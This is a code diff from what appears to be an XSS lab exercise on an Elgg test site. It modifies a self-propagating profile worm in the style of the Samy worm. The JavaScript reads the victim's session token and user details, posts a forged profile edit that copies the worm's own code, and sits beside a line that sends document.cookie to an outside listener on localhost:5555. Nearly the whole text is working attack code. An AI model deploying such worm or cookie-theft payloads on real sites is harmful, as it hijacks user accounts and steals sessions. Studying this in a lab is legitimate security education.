@@ -12,7 +12,7 @@ document.write('<img src=http://localhost:5555?c=' + escape(document.cookie) + '
 		var elgg_token = "&__elgg_token=" + elgg.security.token.__elgg_token;
 		var guid = "&guid=" + elgg.session.user.guid;
 		var name = "&name=" + elgg.session.user.name;
-		var desc = "&description=Samy is my hero. XuZichuan" + "&accesslevel[description]=2";
+		var desc = "&description=Samy is my hero. xzc" + "&accesslevel[description]=2";
 		var content = elgg_token + elgg_ts + name + desc + guid;
 		var sendurl = "http://www.xsslabelgg.com/action/profile/edit";
 	
@@ -39,7 +39,7 @@ document.write('<img src=http://localhost:5555?c=' + escape(document.cookie) + '
 		var elgg_token = "&__elgg_token=" + elgg.security.token.__elgg_token;
 		var guid = "&guid=" + elgg.session.user.guid;
 		var name = "&name=" + elgg.session.user.name;
-		var desc = "&description=Samy is my hero. XuZichuan" + wormcode + "&accesslevel[description]=2";
+		var desc = "&description=Samy is my hero. xzc" + wormcode + "&accesslevel[description]=2";
 		var content = elgg_token + elgg_ts + name + desc + guid;
 		var sendurl = "http://www.xsslabelgg.com/action/profile/edit";
 		if (elgg.session.user.guid != 47) {
